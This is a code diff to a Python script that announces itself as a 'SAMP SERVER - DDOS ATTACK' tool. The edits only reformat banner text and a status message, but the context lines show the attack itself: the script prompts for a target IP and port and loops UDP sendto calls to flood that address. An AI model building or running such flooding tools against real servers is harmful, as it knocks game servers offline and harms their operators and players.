@@ -59,15 +59,15 @@ import socket
 import threading
 
 print("")
-print(""""  | BY. PH ~DHRUBO | """)
+print(""""       | BY. PH ~DHRUBO |   """)
 
 print("")
-print(""" 
-	| SAMP SERVER - DDOS ATTACK | 
+print("""  
+	    | SAMP SERVER - DDOS ATTACK | 
 """)
 print("")
 print("""
-	  - MADE BY DHRUBO -
+	    - MADE BY DHRUBO -
 """)
 print("")
 ip = input(" IP : ")
@@ -84,7 +84,7 @@ def udpsirisakz():
 			for x in range(1):
 				s.sendto(data,addr)
 				thr += 1
-			print(f"| SAMP SERVER - ATTACK | {ip}:{port} Time: 120 >>", thr)
+			print(f"| SERVER ATTACK | {ip}:{port} Time:120 >>", thr)
 		except:
 			thr -= 1
 
